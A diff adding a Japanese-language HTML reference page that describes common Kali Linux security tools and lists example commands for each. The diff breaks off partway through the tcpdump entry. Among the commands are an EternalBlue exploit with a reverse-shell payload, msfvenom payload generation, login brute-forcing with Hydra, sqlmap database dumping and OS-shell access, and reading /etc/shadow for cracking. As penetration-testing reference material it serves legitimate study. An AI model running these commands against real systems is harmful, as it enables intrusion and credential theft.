@@ -1,0 +1,1182 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kali Linux Tools Guide</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface-hover: #1c2128;
+    --border: #30363d;
+    --text: #c9d1d9;
+    --text-muted: #8b949e;
+    --accent: #58a6ff;
+    --accent-hover: #79b8ff;
+    --success: #3fb950;
+    --warning: #d29922;
+    --danger: #f85149;
+    --code-bg: #0d1117;
+    --font-mono: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+    --font-sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: var(--font-sans);
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.6;
+    min-height: 100vh;
+  }
+
+  .container {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 24px;
+  }
+
+  header {
+    text-align: center;
+    padding: 40px 20px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 24px;
+  }
+
+  header h1 {
+    font-size: 2.5rem;
+    font-weight: 700;
+    background: linear-gradient(90deg, var(--accent), var(--success));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 8px;
+  }
+
+  header p {
+    color: var(--text-muted);
+    font-size: 1.1rem;
+  }
+
+  .main-tabs {
+    display: flex;
+    gap: 4px;
+    margin-bottom: 24px;
+    padding: 4px;
+    background: var(--surface);
+    border-radius: 12px;
+    border: 1px solid var(--border);
+  }
+
+  .main-tab {
+    flex: 1;
+    padding: 12px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 0.95rem;
+    font-weight: 600;
+    color: var(--text-muted);
+    background: transparent;
+    border: none;
+    transition: all 0.2s;
+    text-align: center;
+  }
+
+  .main-tab:hover {
+    color: var(--text);
+    background: var(--surface-hover);
+  }
+
+  .main-tab.active {
+    color: #fff;
+    background: linear-gradient(135deg, var(--accent), #0969da);
+  }
+
+  .tab-content {
+    display: none;
+  }
+
+  .tab-content.active {
+    display: block;
+  }
+
+  .search-box {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: var(--bg);
+    padding: 16px 0;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 24px;
+  }
+
+  .search-box input {
+    width: 100%;
+    padding: 14px 20px;
+    font-size: 1rem;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    color: var(--text);
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .search-box input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15);
+  }
+
+  .search-box input::placeholder {
+    color: var(--text-muted);
+  }
+
+  .category-tabs {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-bottom: 24px;
+    padding: 4px;
+    background: var(--surface);
+    border-radius: 12px;
+    border: 1px solid var(--border);
+  }
+
+  .category-tab {
+    padding: 10px 18px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 0.9rem;
+    font-weight: 500;
+    color: var(--text-muted);
+    background: transparent;
+    border: none;
+    transition: all 0.2s;
+    white-space: nowrap;
+  }
+
+  .category-tab:hover {
+    color: var(--text);
+    background: var(--surface-hover);
+  }
+
+  .category-tab.active {
+    color: #fff;
+    background: var(--accent);
+  }
+
+  .tools-grid {
+    display: grid;
+    gap: 16px;
+  }
+
+  .tool-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    overflow: hidden;
+    transition: border-color 0.2s, transform 0.2s;
+  }
+
+  .tool-card:hover {
+    border-color: var(--accent);
+    transform: translateY(-2px);
+  }
+
+  .tool-header {
+    padding: 20px 24px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    user-select: none;
+  }
+
+  .tool-icon {
+    width: 48px;
+    height: 48px;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.5rem;
+    font-weight: 700;
+    flex-shrink: 0;
+    background: linear-gradient(135deg, var(--accent), #0969da);
+    color: #fff;
+  }
+
+  .tool-info {
+    flex: 1;
+  }
+
+  .tool-info h3 {
+    font-size: 1.2rem;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 4px;
+  }
+
+  .tool-info .tagline {
+    font-size: 0.85rem;
+    color: var(--text-muted);
+  }
+
+  .tool-meta {
+    display: flex;
+    gap: 12px;
+    align-items: center;
+  }
+
+  .tool-tag {
+    font-size: 0.75rem;
+    padding: 4px 10px;
+    border-radius: 20px;
+    background: rgba(88, 166, 255, 0.1);
+    color: var(--accent);
+    font-weight: 500;
+  }
+
+  .tool-tag.network { background: rgba(63, 185, 80, 0.1); color: var(--success); }
+  .tool-tag.web { background: rgba(210, 153, 34, 0.1); color: var(--warning); }
+  .tool-tag.wireless { background: rgba(248, 81, 73, 0.1); color: var(--danger); }
+  .tool-tag.crypto { background: rgba(139, 148, 158, 0.1); color: var(--text-muted); }
+  .tool-tag.exploit { background: rgba(210, 153, 34, 0.15); color: var(--warning); }
+  .tool-tag.forensics { background: rgba(88, 166, 255, 0.15); color: var(--accent); }
+
+  .expand-icon {
+    font-size: 1.2rem;
+    color: var(--text-muted);
+    transition: transform 0.3s;
+  }
+
+  .tool-card.expanded .expand-icon {
+    transform: rotate(180deg);
+  }
+
+  .tool-body {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.4s ease-out;
+  }
+
+  .tool-card.expanded .tool-body {
+    max-height: 3000px;
+    transition: max-height 0.6s ease-in;
+  }
+
+  .tool-content {
+    padding: 0 24px 24px;
+    border-top: 1px solid var(--border);
+  }
+
+  .section {
+    margin-top: 20px;
+  }
+
+  .section-title {
+    font-size: 0.85rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    color: var(--accent);
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .section-title::before {
+    content: '';
+    display: inline-block;
+    width: 4px;
+    height: 16px;
+    background: var(--accent);
+    border-radius: 2px;
+  }
+
+  .desc-text {
+    color: var(--text-muted);
+    font-size: 0.95rem;
+    line-height: 1.7;
+  }
+
+  .code-block {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    margin-top: 12px;
+    overflow: hidden;
+  }
+n  .code-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 16px;
+    background: rgba(88, 166, 255, 0.05);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-label {
+    font-size: 0.75rem;
+    font-weight: 600;
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  .copy-btn {
+    padding: 6px 14px;
+    font-size: 0.8rem;
+    font-weight: 500;
+    color: var(--text);
+    background: var(--surface-hover);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .copy-btn:hover {
+    background: var(--accent);
+    color: #fff;
+    border-color: var(--accent);
+  }
+
+  .copy-btn.copied {
+    background: var(--success);
+    border-color: var(--success);
+    color: #fff;
+  }
+
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    font-family: var(--font-mono);
+    font-size: 0.85rem;
+    line-height: 1.6;
+    color: var(--text);
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  .mechanism-list {
+    list-style: none;
+    padding: 0;
+  }
+
+  .mechanism-list li {
+    padding: 8px 0;
+    padding-left: 24px;
+    position: relative;
+    color: var(--text-muted);
+    font-size: 0.95rem;
+  }
+
+  .mechanism-list li::before {
+    content: '▸';
+    position: absolute;
+    left: 0;
+    color: var(--accent);
+    font-weight: bold;
+  }
+
+  .no-results {
+    text-align: center;
+    padding: 60px 20px;
+    color: var(--text-muted);
+    font-size: 1.1rem;
+  }
+
+  .footer-note {
+    text-align: center;
+    padding: 40px 20px;
+    color: var(--text-muted);
+    font-size: 0.9rem;
+    border-top: 1px solid var(--border);
+    margin-top: 40px;
+  }
+
+  .footer-note .warning {
+    color: var(--danger);
+    font-weight: 600;
+  }
+
+  /* Reverse lookup styles */
+  .reverse-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+    gap: 16px;
+  }
+
+  .reverse-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 24px;
+    transition: border-color 0.2s, transform 0.2s;
+  }
+
+  .reverse-card:hover {
+    border-color: var(--accent);
+    transform: translateY(-2px);
+  }
+
+  .reverse-card .task-title {
+    font-size: 1.1rem;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .reverse-card .task-title .emoji {
+    font-size: 1.4rem;
+  }
+
+  .reverse-card .task-desc {
+    color: var(--text-muted);
+    font-size: 0.9rem;
+    margin-bottom: 16px;
+    line-height: 1.6;
+  }
+
+  .reverse-card .tool-link {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 10px 14px;
+    background: rgba(88, 166, 255, 0.08);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-decoration: none;
+    color: inherit;
+  }
+
+  .reverse-card .tool-link:hover {
+    background: rgba(88, 166, 255, 0.15);
+    border-color: var(--accent);
+  }
+
+  .reverse-card .tool-link .link-icon {
+    width: 36px;
+    height: 36px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.1rem;
+    font-weight: 700;
+    background: linear-gradient(135deg, var(--accent), #0969da);
+    color: #fff;
+    flex-shrink: 0;
+  }
+
+  .reverse-card .tool-link .link-info {
+    flex: 1;
+  }
+
+  .reverse-card .tool-link .link-info .link-name {
+    font-weight: 600;
+    font-size: 0.95rem;
+    color: var(--text);
+  }
+
+  .reverse-card .tool-link .link-info .link-desc {
+    font-size: 0.8rem;
+    color: var(--text-muted);
+  }
+
+  .reverse-card .tool-link .link-arrow {
+    color: var(--accent);
+    font-size: 1.2rem;
+  }
+
+  .reverse-search {
+    margin-bottom: 24px;
+  }
+
+  .reverse-search input {
+    width: 100%;
+    padding: 14px 20px;
+    font-size: 1rem;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    color: var(--text);
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .reverse-search input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15);
+  }
+
+  .reverse-search input::placeholder {
+    color: var(--text-muted);
+  }
+
+  .section-header {
+    font-size: 1.3rem;
+    font-weight: 600;
+    color: var(--text);
+    margin: 32px 0 16px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-header:first-of-type {
+    margin-top: 0;
+  }
+
+  @media (max-width: 768px) {
+    header h1 { font-size: 1.8rem; }
+    .tool-header { padding: 16px; }
+    .tool-icon { width: 40px; height: 40px; font-size: 1.2rem; }
+    .tool-info h3 { font-size: 1rem; }
+    pre { font-size: 0.75rem; }
+    .reverse-grid { grid-template-columns: 1fr; }
+    .main-tab { font-size: 0.85rem; padding: 10px 14px; }
+  }
+</style>
+<base target="_blank">
+</head>
+<body>
+
+<div class="container">
+  <header>
+    <h1>🔧 Kali Linux Tools Guide</h1>
+    <p>代表的なセキュリティツールの公式ドキュメントベースまとめ</p>
+  </header>
+
+  <div class="main-tabs" id="mainTabs">
+    <button class="main-tab active" data-tab="tools">📚 ツール一覧</button>
+    <button class="main-tab" data-tab="reverse">🎯 やりたいこと → ツール</button>
+  </div>
+
+  <!-- TAB: Tools List -->
+  <div class="tab-content active" id="tab-tools">
+    <div class="search-box">
+      <input type="text" id="searchInput" placeholder="ツール名や用途で検索... (例: nmap, sql injection, wireless)" />
+    </div>
+
+    <div class="category-tabs" id="categoryTabs">
+      <button class="category-tab active" data-cat="all">すべて</button>
+      <button class="category-tab" data-cat="network">ネットワーク</button>
+      <button class="category-tab" data-cat="web">Web</button>
+      <button class="category-tab" data-cat="wireless">無線</button>
+      <button class="category-tab" data-cat="crypto">暗号/認証</button>
+      <button class="category-tab" data-cat="exploit">エクスプロイト</button>
+      <button class="category-tab" data-cat="forensics">フォレンジック</button>
+    </div>
+
+    <div class="tools-grid" id="toolsGrid"></div>
+  </div>
+
+  <!-- TAB: Reverse Lookup -->
+  <div class="tab-content" id="tab-reverse">
+    <div class="reverse-search">
+      <input type="text" id="reverseSearch" placeholder="やりたいことを検索... (例: ポートスキャン, WiFiクラック, パスワード)" />
+    </div>
+
+    <div id="reverseContent"></div>
+  </div>
+
+  <div class="footer-note">
+    <p class="warning">⚠️ これらのツールは許可を得たシステムでの倫理的セキュリティテストのみに使用してください。</p>
+    <p>不正アクセスは違法です。情報源: Kali Linux公式, Nmap公式, Metasploit Docs, Aircrack-ng公式等</p>
+  </div>
+</div>
+
+<script>
+  const tools = [
+    {
+      id: 'nmap',
+      name: 'Nmap',
+      tagline: 'Network Mapper — ネットワーク探索・ポートスキャナー',
+      category: 'network',
+      icon: 'N',
+      description: 'Nmap（"Network Mapper"）は、ネットワーク探索およびセキュリティ/ポートスキャナーです。生のIPパケットを新しい方法で使用して、ネットワーク上で利用可能なホスト、ホストが提供しているサービス（アプリケーション名とバージョン）、実行中のOS、パケットフィルタ/ファイアウォールの種類、その他数十の特性を判断します。',
+      mechanism: [
+        '生のIPパケットを使用してターゲットに送信',
+        'TCP SYNスキャン（ステルススキャン）、TCP connectスキャン、UDPスキャン、ACKスキャンなど複数のスキャン技法',
+        'Nmap Scripting Engine (NSE): Lua言語で書かれたスクリプトで脆弱性検出や情報収集を自動化',
+        'OSフィンガープリンティング: TCP/IPスタック実装の違いからOSを推定'
+      ],
+      commands: [
+        { label: '基本的なポートスキャン', code: 'nmap 192.168.1.1' },
+        { label: 'OS・バージョン検出 + スクリプトスキャン + traceroute', code: 'nmap -A -T4 scanme.nmap.org' },
+        { label: '全ポートスキャン', code: 'nmap -p 1-65535 192.168.1.1' },
+        { label: 'SYNステルススキャン（root権限必要）', code: 'nmap -sS 192.168.1.1' },
+        { label: 'サービスバージョン検出', code: 'nmap -sV 192.168.1.1' },
+        { label: 'OS検出', code: 'nmap -O 192.168.1.1' },
+        { label: '脆弱性スクリプトスキャン', code: 'nmap --script=vuln 192.168.1.1' },
+        { label: 'HTTP列挙スクリプト', code: 'nmap --script=http-enum 192.168.1.1' },
+        { label: 'XML出力', code: 'nmap -oX output.xml 192.168.1.1' }
+      ]
+    },
+    {
+      id: 'metasploit',
+      name: 'Metasploit Framework',
+      tagline: 'エクスプロイト開発・テスト・実行プラットフォーム',
+      category: 'exploit',
+      icon: 'M',
+      description: 'Metasploit Frameworkは、リモートターゲットに対するエクスプロイトの開発、テスト、実行のための高度なオープンソースプラットフォームです。既知の脆弱性を悪用するエクスプロイトコードとペイロードが同梱されています。',
+      mechanism: [
+        'モジュール化アーキテクチャ: エクスプロイト、ペイロード、補助モジュール、ポストエクスプロイト、エンコーダ、NOPジェネレータに分離',
+        'ペイロード: ターゲット上で実行されるコード（Meterpreterリバースシェルなど）',
+        'エクスプロイトランキング: Excellent〜Manualの7段階で信頼性を評価',
+        'データベース統合: スキャン結果やホスト情報をPostgreSQLに保存'
+      ],
+      commands: [
+        { label: 'コンソール起動', code: 'msfconsole' },
+        { label: 'エクスプロイト検索', code: 'search ms17-010\nsearch type:exploit name:apache' },
+        { label: 'エクスプロイト選択と実行', code: 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit' },
+        { label: 'セッション管理', code: 'sessions -l\nsessions -i 1' },
+        { label: '補助モジュール（SMBバージョンスキャン）', code: 'use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun' },
+        { label: 'ペイロード生成（msfvenom）', code: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe' },
+        { label: 'データベース初期化', code: 'msfdb init\nmsfdb run' }
+      ]
+    },
+    {
+      id: 'wireshark',
+      name: 'Wireshark',
+      tagline: 'ネットワークプロトコルアナライザー（パケットアナライザー）',
+      category: 'network',
+      icon: 'W',
+      description: 'Wiresharkは、世界で最も広く使用されているネットワークプロトコルアナライザーです。ネットワークトラフィックをキャプチャし、論理的および物理的アドレスの詳細などのコンポーネントを表示します。暗号化されていない場合はパケットの内容も明らかにします。',
+      mechanism: [
+        'libpcap/WinPcap/Npcapを使用してネットワークインターフェースから生のパケットをキャプチャ',
+        'ディスセクタ: 数百のプロトコルに対応したパーサーでパケットを階層的に解析',
+        'ディスプレイフィルタ: キャプチャ後に特定のトラフィックを絞り込み表示',
+        'キャプチャフィルタ: libpcap構文でキャプチャ時に不要なパケットを除外'
+      ],
+      commands: [
+        { label: 'GUI起動', code: 'wireshark' },
+        { label: '特定インターフェースでキャプチャ', code: 'wireshark -i eth0' },
+        { label: 'キャプチャフィルタ指定', code: 'wireshark -f "tcp port 80"' },
+        { label: '既存ファイルを開く', code: 'wireshark capture.pcap' },
+        { label: 'tsharkでバックグラウンドキャプチャ', code: 'tshark -i eth0 -w capture.pcap' },
+        { label: 'tsharkでディスプレイフィルタ', code: 'tshark -r capture.pcap -Y "http.request.method == GET"' },
+        { label: '特定ホストのトラフィックのみ', code: 'tshark -i eth0 host 192.168.1.1' },
+        { label: 'TCPストリーム追跡', code: 'tshark -r capture.pcap -z follow,tcp,ascii,0' }
+      ]
+    },
+    {
+      id: 'aircrack',
+      name: 'Aircrack-ng',
+      tagline: '802.11 WEP / WPA/WPA2-PSK キークラッキングスイート',
+      category: 'wireless',
+      icon: 'A',
+      description: 'Aircrack-ngは、802.11 WEPおよびWPA/WPA2-PSKキーのクラッキングプログラムです。無線LANのセキュリティ監査ツール群です。',
+      mechanism: [
+        'WEPクラッキング - PTW方式（デフォルト）: ARPパケットのみを使用。少量のデータパケットでWEPキーを復元。40ビットと104ビットのみ対応。',
+        'WEPクラッキング - FMS/KoreK方式: 統計的手法とブルートフォースを組み合わせる。より多くのパケットが必要だがPTWが失敗する場合も回復可能。',
+        'WPA/WPA2クラッキング: 4-wayハンドシェイクをキャプチャし辞書攻撃のみ。ESSIDはPMK生成時のソルトとして必須。',
+        'SIMD最適化: SSE2, AVX, AVX2, AVX512を自動検出して高速化'
+      ],
+      commands: [
+        { label: 'WEPクラッキング（PTW方式）', code: 'aircrack-ng capture.cap' },
+        { label: 'WEPクラッキング（KoreK方式）', code: 'aircrack-ng -K capture.cap' },
+        { label: 'WPA/WPA2辞書攻撃', code: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap' },
+        { label: '特定BSSID指定', code: 'aircrack-ng -b 00:14:6C:7E:40:80 -w password.lst capture.cap' },
+        { label: '特定ESSID指定（隠しSSID必須）', code: 'aircrack-ng -e "MyNetwork" -w password.lst capture.cap' },
+        { label: 'セッション保存と復元', code: 'aircrack-ng --new-session current.session -w password.lst capture.cap\naircrack-ng --restore-session current.session' },
+        { label: 'モニターモード有効化', code: 'airmon-ng start wlan0' },
+        { label: 'パケットキャプチャ', code: 'airodump-ng wlan0mon\nairodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w output wlan0mon' },
+        { label: 'ARPリクエスト注入（WEP用）', code: 'aireplay-ng -3 -b 00:14:6C:7E:40:80 wlan0mon' }
+      ]
+    },
+    {
+      id: 'hydra',
+      name: 'Hydra',
+      tagline: '並列化ネットワークログオンクラッカー',
+      category: 'crypto',
+      icon: 'H',
+      description: 'Hydraは、並列化されたログオンクラッカーで、多数のプロトコルを攻撃対象とします。非常に高速で柔軟であり、新しいモジュールの追加も容易です。',
+      mechanism: [
+        '並列接続: 複数のスレッドで同時にログイン試行を実行',
+        'プロトコル対応: Cisco AAA, FTP, HTTP(S), IMAP, LDAP, MS-SQL, MySQL, Oracle, POP3, PostgreSQL, RDP, SMB, SMTP, SNMP, SSH, Telnet, VNC, XMPPなど',
+        '攻撃モード: 辞書攻撃、ブルートフォース（-xオプション）、nullパスワード、ログイン名と同じパスワード、逆転ログイン名など'
+      ],
+      commands: [
+        { label: 'SSH辞書攻撃', code: 'hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123' },
+        { label: 'FTP複数ユーザー・パスワード', code: 'hydra -L users.txt -P passwords.txt ftp://192.168.1.1' },
+        { label: 'HTTPフォームブルートフォース', code: 'hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"' },
+        { label: 'RDP攻撃', code: 'hydra -l administrator -P passwords.txt rdp://192.168.1.100' },
+        { label: 'SMB攻撃', code: 'hydra -L users.txt -P passwords.txt smb://192.168.1.1' },
+        { label: 'MySQL攻撃', code: 'hydra -l root -P passwords.txt mysql://192.168.1.1' },
+        { label: 'ブルートフォース生成（4〜8文字）', code: 'hydra -l admin -x 4:8:aA1 192.168.1.1 http-get' },
+        { label: 'セッション復元', code: 'hydra -R' },
+        { label: '複数ターゲット攻撃', code: 'hydra -L users.txt -P passwords.txt -M targets.txt ssh' }
+      ]
+    },
+    {
+      id: 'john',
+      name: 'John the Ripper',
+      tagline: 'パスワードクラッキングツール',
+      category: 'crypto',
+      icon: 'J',
+      description: 'John the Ripperは、システム管理者が弱い（推測しやすい、またはブルートフォースでクラックしやすい）パスワードを見つけるのを助けるために設計されたツールです。',
+      mechanism: [
+        '複数のハッシュ形式対応: crypt(3), Kerberos AFS, Windows LM/NTLMハッシュ、その他多数',
+        'Single crack mode: ユーザー名やGECOSフィールドなどの情報からパスワードを推測',
+        'Wordlist mode: 辞書ファイルを使用',
+        'Incremental mode: 文字セットに基づくブルートフォース',
+        'External mode: C言語ライクな構文でカスタムルールを記述',
+        'OpenMP/GPU対応: 並列処理で高速化'
+      ],
+      commands: [
+        { label: '基本的な辞書攻撃', code: 'john --wordlist=/usr/share/john/password.lst hashes.txt' },
+        { label: 'ルール適用辞書攻撃', code: 'john --wordlist=/usr/share/john/password.lst --rules hashes.txt' },
+        { label: 'インクリメンタル（ブルートフォース）モード', code: 'john --incremental hashes.txt' },
+        { label: '特定フォーマット指定', code: 'john --format=raw-md5 hashes.txt\njohn --format=sha512crypt hashes.txt\njohn --format=nt hashes.txt' },
+        { label: 'クラック結果表示', code: 'john --show hashes.txt' },
+        { label: '未クラック表示', code: 'john --show=left hashes.txt' },
+        { label: 'セッション保存・復元', code: 'john --session=myjob --wordlist=wordlist.txt hashes.txt\njohn --restore=myjob' },
+        { label: 'unshadowで結合', code: 'unshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt' },
+        { label: 'パスワードリスト重複除去', code: 'unique -v -inp=allwords.txt uniques.txt' }
+      ]
+    },
+    {
+      id: 'sqlmap',
+      name: 'sqlmap',
+      tagline: '自動SQLインジェクション検出・悪用ツール',
+      category: 'web',
+      icon: 'S',
+      description: 'sqlmapは、WebアプリケーションにおけるSQLインジェクション脆弱性の検出と悪用を自動化するツールです。脆弱性を検出後、DBMSのフィンガープリンティング、セッションユーザーとデータベースの取得、ユーザー/パスワードハッシュ/権限/データベースの列挙、テーブル/カラムのダンプなどが可能です。',
+      mechanism: [
+        '自動検出: GET/POSTパラメータ、Cookie、User-Agent、RefererなどのHTTPパラメータを自動的にテスト',
+        '複数のSQLインジェクション技法: Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries',
+        'DBMS対応: MySQL, Oracle, PostgreSQL, MS SQL Server, SQLite, IBM DB2, Firebird, Sybase, SAP MaxDB, HSQLDB, Informix',
+        '技術レベル（--level 1-5）: テストの深さを調整',
+        'リスクレベル（--risk 1-3）: 危険性の高いテストを含めるかどうか'
+      ],
+      commands: [
+        { label: '基本的なURLスキャン', code: 'sqlmap -u "http://192.168.1.250/?p=1&forumaction=search"' },
+        { label: 'データベース名列挙', code: 'sqlmap -u "http://target.com/page.php?id=1" --dbs' },
+        { label: 'テーブル列挙', code: 'sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables' },
+        { label: 'カラム列挙', code: 'sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns' },
+        { label: 'データダンプ', code: 'sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump' },
+        { label: '全データベースダンプ', code: 'sqlmap -u "http://target.com/page.php?id=1" --dump-all' },
+        { label: 'パスワードハッシュ取得', code: 'sqlmap -u "http://target.com/page.php?id=1" --passwords' },
+        { label: 'OSシェル取得', code: 'sqlmap -u "http://target.com/page.php?id=1" --os-shell' },
+        { label: 'POSTデータ指定', code: 'sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"' },
+        { label: 'バッチモード（確認なし）', code: 'sqlmap -u "http://target.com/page.php?id=1" --batch' },
+        { label: '技術レベル・リスク上げる', code: 'sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3' }
+      ]
+    },
+    {
+      id: 'burp',
+      name: 'Burp Suite',
+      tagline: 'Webアプリケーションセキュリティテスト統合プラットフォーム',
+      category: 'web',
+      icon: 'B',
+      description: 'Burp Suiteは、Webアプリケーションのセキュリティテストを実行するための統合プラットフォームです。さまざまなツールがシームレスに連携し、アプリケーションの攻撃表面の初期マッピングと分析から、セキュリティ脆弱性の発見と悪用まで、テストプロセス全体をサポートします。',
+      mechanism: [
+        'Proxy: ブラウザとサーバー間のHTTP/HTTPSトラフィックを傍受・改変',
+        'Spider: Webアプリケーションを自動的にクロールしてコンテンツを発見',
+        'Scanner（Pro版）: 自動的に脆弱性をスキャン',
+        'Intruder: 自動化されたカスタマイズ可能な攻撃（ファジング、ブルートフォースなど）',
+        'Repeater: 個別のリクエストを手動で改変して再送信',
+        'Sequencer: セッショントークンのランダム性を分析',
+        'Extender: BApp Storeや独自の拡張機能を追加'
+      ],
+      commands: [
+        { label: 'Burp Suite起動', code: 'burpsuite' },
+        { label: 'デフォルト設定で起動', code: 'burpsuite --use-defaults' },
+        { label: '特定プロジェクトファイルを開く', code: 'burpsuite --project-file=/path/to/project.burp' },
+        { label: '拡張機能自動読み込み無効化', code: 'burpsuite --disable-extensions' },
+        { label: 'GUI基本フロー', code: '# 1. Proxyタブ → Intercept is on でリクエスト傍受\n# 2. ブラウザのプロキシ設定を127.0.0.1:8080に設定\n# 3. CA証明書をインストールしてHTTPSを傍受\n# 4. Targetタブでスコープを設定\n# 5. Intruderでペイロードを設定して攻撃実行' }
+      ]
+    },
+    {
+      id: 'nikto',
+      name: 'Nikto',
+      tagline: 'Webサーバー・CGIセキュリティスキャナー',
+      category: 'web',
+      icon: 'Nk',
+      description: 'Niktoは、Perlで書かれたプラガブルなWebサーバーおよびCGIスキャナーです。rfpのLibWhiskerを使用して、高速なセキュリティまたは情報収集チェックを実行します。',
+      mechanism: [
+        'CSV形式のチェックデータベース: 簡単に更新可能',
+        '複数のHTTPバージョン対応: 自動切り替え',
+        'SSL対応: libnet-ssleay-perl経由',
+        'プロキシ対応: 認証付きプロキシもサポート',
+        'チューニングオプション: テストの種類を選択可能（ファイル探索、設定ミス、情報漏洩、XSS、SQLインジェクションなど）'
+      ],
+      commands: [
+        { label: '基本的なスキャン', code: 'nikto -h 192.168.0.102' },
+        { label: '詳細出力 + HTMLレポート', code: 'nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 192.168.0.102' },
+        { label: 'SSL（HTTPS）強制', code: 'nikto -h https://192.168.0.102 -ssl' },
+        { label: '特定ポート指定', code: 'nikto -h 192.168.0.102 -p 8080' },
+        { label: '仮想ホスト指定', code: 'nikto -h 192.168.0.102 -vhost example.com' },
+        { label: '認証情報指定', code: 'nikto -h 192.168.0.102 -id admin:password' },
+        { label: 'チューニング（特定テストのみ）', code: 'nikto -h 192.168.0.102 -Tuning 12349' },
+        { label: '全CGIディレクトリチェック', code: 'nikto -h 192.168.0.102 -C all' },
+        { label: 'プラグイン一覧', code: 'nikto -list-plugins' }
+      ]
+    },
+    {
+      id: 'hashcat',
+      name: 'Hashcat',
+      tagline: '世界最速のパスワードリカバリーツール',
+      category: 'crypto',
+      icon: 'Hc',
+      description: 'Hashcatは、高度に最適化されたパスワードリカバリーツールです。GPUを活用した並列処理により、非常に高速なハッシュクラッキングを実現します。',
+      mechanism: [
+        'GPUアクセラレーション: OpenCL/CUDAを使用してGPUの並列処理能力を活用',
+        '複数の攻撃モード: 辞書攻撃、組み合わせ攻撃、マスク攻撃、ハイブリッド攻撃、ルールベース攻撃',
+        '300種類以上のハッシュ形式対応',
+        '分散クラッキング: 複数のマシンで協調してクラッキング'
+      ],
+      commands: [
+        { label: 'MD5辞書攻撃', code: 'hashcat -m 0 -a 0 hash.txt wordlist.txt' },
+        { label: 'WPA/WPA2ハンドシェイク攻撃', code: 'hashcat -m 2500 -a 0 capture.hccapx wordlist.txt' },
+        { label: 'マスク攻撃（ブルートフォース）', code: 'hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l' },
+        { label: 'ルール適用攻撃', code: 'hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule' },
+        { label: '組み合わせ攻撃', code: 'hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt' }
+      ]
+    },
+    {
+      id: 'tcpdump',
+      name: 'tcpdump',
+      tagline: 'コマンドラインパケットアナライザー',
+      category: 'network',
+      icon: 'Td',
